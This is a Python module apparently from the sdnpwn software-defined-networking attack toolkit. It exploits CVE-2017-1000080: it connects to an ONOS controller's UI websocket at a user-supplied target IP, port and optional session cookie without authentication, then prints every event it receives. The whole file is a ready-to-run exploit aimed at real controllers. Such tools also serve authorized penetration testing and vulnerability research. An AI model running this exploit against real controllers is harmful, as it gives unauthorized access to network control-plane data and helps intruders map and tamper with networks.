
import signal
import websocket
import json

import modules.sdnpwn_common as sdnpwn

def signal_handler(signal, frame):
  #Handle Ctrl+C here
  print("")
  sdnpwn.message("Stopping...", sdnpwn.NORMAL)
  exit(0)

def info():
  return "Attempts to connect to the ONOS websocket without authentication (CVE-2017-1000080). Will dump observed events from the websocket."
  
def usage():
  sdnpwn.addUsage(["-t", "--target"], "IP address of controller", True)
  sdnpwn.addUsage(["-p", "--port"], "Websocket port (Default 8181)", False)
  sdnpwn.addUsage(["-c", "--cookie"], "Add cookie (like 'JSESSIONID=1sz99uvm1z2971t18f55lmpc0d')", False)
  
  return sdnpwn.getUsage()

def onOpen(ws):
  sdnpwn.printSuccess("Connected to websocket!")

def onMessage(ws, msgJSON):
  msg = json.loads(msgJSON)
  print(json.dumps(msg, indent=4, sort_keys=True))
  
def onError(ws, err):
  sdnpwn.printError("Got error: " + str(err))
  
def onClose(ws):
  sdnpwn.printWarning("Connection to websocket closed!")

def run(params):
  signal.signal(signal.SIGINT, signal_handler) #Assign the signal handler
  
  if(sdnpwn.checkArg(["-t", "--target"], params)):
    
    port = str(sdnpwn.getArg(["-p", "--port"], params, 8181))
    cookie = sdnpwn.getArg(["-c", "--cookie"], params, None)
    
    wsURL = "ws://" + sdnpwn.getArg(["-t", "--target"], params) + ":" + port + "/onos/ui/websock/core"
    #websocket.enableTrace(True)
    ws = websocket.WebSocketApp(wsURL)
    ws.on_open = onOpen
    ws.on_message = onMessage
    ws.on_error = onError
    ws.on_close = onClose
    
    if(cookie is not None):
      ws.cookie = cookie
    
    sdnpwn.printNormal("Attempting connection to " + wsURL)
    ws.run_forever()
  else:
    print(usage())
    